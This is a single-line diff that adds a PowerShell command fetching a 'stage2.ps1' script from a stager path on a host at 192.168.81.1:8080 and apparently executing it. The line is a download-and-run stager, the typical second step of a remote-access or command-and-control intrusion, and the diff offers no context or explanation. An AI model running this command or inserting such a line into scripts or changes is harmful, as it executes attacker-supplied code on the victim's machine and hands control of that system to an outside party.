@@ -1,0 +1,1 @@
+powershell -c "$((curl "192.168.81.1:8080/scripts/remote/stagers/stage2.ps1").ToString())"
